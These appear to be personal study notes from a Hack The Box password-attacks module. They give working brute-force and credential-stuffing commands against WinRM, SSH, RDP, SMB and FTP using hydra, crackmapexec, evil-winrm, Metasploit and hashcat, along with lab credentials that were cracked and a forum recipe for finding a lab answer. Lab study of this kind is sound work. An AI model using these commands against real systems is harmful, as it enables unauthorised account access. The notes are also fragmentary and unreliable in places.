
# Network Services

All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to):
FTP
NFS
SMB
IMAP/POP3
SSH
MySQL/MSSQL
VNC
WinRM
RDP
Telnet
SMTP
LDAP

---
`RDP`, `WinRM`, and `SSH`. SSH is now much less common on Windows, but it is the leading service for Linux-based systems. for remote management
`they are configured with default settings in many cases.`
an authentication mechanism using a username and password for all of them

## WinRM

windows remote management.
WinRM must be activated and configured manually in Windows 10.
WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).
#### CrackMapExec Usage
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

#### Evil-WinRM
```shell-session
AhmaDb0x@htb[/htb]$ sudo gem install evil-winrm
```

```shell-session
AhmaDb0x@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
```
over Powershell Remoting Protocol (MS-PSRP)
john:november (Pwn3d!)


## SSH
This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.
dennis:rockstar
#### Symmetric Encryption

Symmetric encryption uses the `same key` for encryption and decryption. However, anyone who has access to the key could also access the transmitted data.
a key exchange procedure is needed for secure symmetric encryption.
`[Diffie-Hellman]`is a mathematical [method](https://en.wikipedia.org/wiki/Key-agreement_protocol "Key-agreement protocol") of securely generating a symmetric crypto key
[![](https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/DiffieHellman.png/409px-DiffieHellman.png)](https://en.wikipedia.org/wiki/File:DiffieHellman.png)
symmetrical cipher system can be used, such as AES, Blowfish, 3DES.

#### Asymmetrical Encryption
Asymmetric encryption uses `two SSH keys`: a `private key` and a `public key`. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.

#### Hashing
The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.
irreversible.
#### Hydra - SSH
```shell-session
AhmaDb0x@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197 or smb or login page or ftp or mssql
```


## Remote Desktop Protocol (RDP)

network protocol that allows remote access to Windows systems via `TCP port 3389` by default.

Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.

#### Hydra - RDP
```shell-session
AhmaDb0x@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
```
chris 789456123
try to use hydra command in a msf console (winrm) 

then u will be able to rdp the target
#### xFreeRDP
```shell-session
AhmaDb0x@htb[/htb]$ xfreerdp /v:10.129.202.136 /u:chris /p:789456123
```
hydra -L username.list -P password.list rdp://10.129.202.136

## SMB
[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

#### Hydra - SMB
```shell-session
AhmaDb0x@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```

#### Hydra - Error
```shell-session
AhmaDb0x@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, metasploit
```shell-session
AhmaDb0x@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### shares smb
```shell-session
AhmaDb0x@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```
#### Smbclient
```shell-session
AhmaDb0x@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```

cassie:12345678910







# # Password Mutations

|**Description**|**Password Syntax**|
|---|---|
|First letter is uppercase.|`Password`|
|Adding numbers.|`Password123`|
|Adding year.|`Password2022`|
|Adding month.|`Password02`|
|Last character is an exclamation mark.|`Password2022!`|
|Adding special characters.|`P@ssw0rd2022!`|

#### hashcat
|**Function**|**Description**|
|---|---|
|`:`|Do nothing.|
|`l`|Lowercase all letters.|
|`u`|Uppercase all letters.|
|`c`|Capitalize the first letter and lowercase others.|
|`sXY`|Replace all instances of X with Y.|
|`$!`|Add the exclamation character at the end.|
#### Generating Rule-based Wordlist

```shell-session
AhmaDb0x@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
AhmaDb0x@htb[/htb]$ cat mut_password.list
```

#### Hashcat Existing Rules

```shell-session
AhmaDb0x@htb[/htb]$ ls /usr/share/hashcat/rules/
```

```shell-session
AhmaDb0x@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
AhmaDb0x@htb[/htb]$ wc -l inlane.wordlist

326
```

1. Take password.list and custom.rule to create a mutation file `hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`
2. Remove all passwords shorter than 10 with `sed -ri '/^.{,9}$/d' mut_password.list`
3. Take the first 7000  `head -7000 mut_password.list `> `7000mut_password.list`
4. Bruteforce FTP `hydra -l sam -P ./7000mut_password.list ftp://10.129.202.64 -t 64`
5. with B-b , grep B 94k_mutated.list > mutated_B.lis 
6. -t48
I propose a new task:

1. Grab that DC character everyone on this thread loves.
2. Put it on a txt file
3. Mutate that new file with their rule.
4. bruteforce as it says

In less than 5 min you have your answer
```shell
# the new rule file
$ cat custom.rule1
c $!
  
# apply rule to the current mutated list
$ hashcat --force mut_password2.list -r custom.rule1 --stdout | sort -u > mut_password3.list
  
# check wordcount
$ wc -w mut_password3.list
54440 mut_password3.list

# keep words that start with a Capital letter
$ grep '^[A-Z]' mut_password3.list > mut_password4.list

# check wordcount
$ wc -w mut_password4.list
47880 mut_password4.list
```

1. Use this final wordlist to brute-force either SMB (using MSF’s auxiliary/scanner/smb/smb_login module making sure to set the user as sam), FTP (`hydra -l sam -P mut_password4.list ftp://[target-IP] -t 48`), or SSH (`hydra -l sam -P mut_password4.list ssh://[target-IP] -t 48`).

**Timescales**:

2. Scanning FTP using `mut_password4.list` and `-t 48`: ~10 minutes.
3. Scanning SMB using `mut_password4.list` via MSF: ~30 minutes.
4. Scanning SSH using `mut_password4.list` and `-t 48`: ~60 minutes.
21][ftp] host: 10.129.202.64   login: sam   password: B@tm@n2022!

#### # Password Reuse


colon (`username:password`). In addition, we can select the passwords and mutate them by our `rules` to increase the probability of hits.

#### Credential Stuffing - Hydra **Syntax**
```shell-session
AhmaDb0x@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
```

$ git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
$ pip3 install -r requirements.txt
$ cp creds /usr/bin/ && chmod +x /usr/bin/creds
$ creds search tomcat
superdba:admin

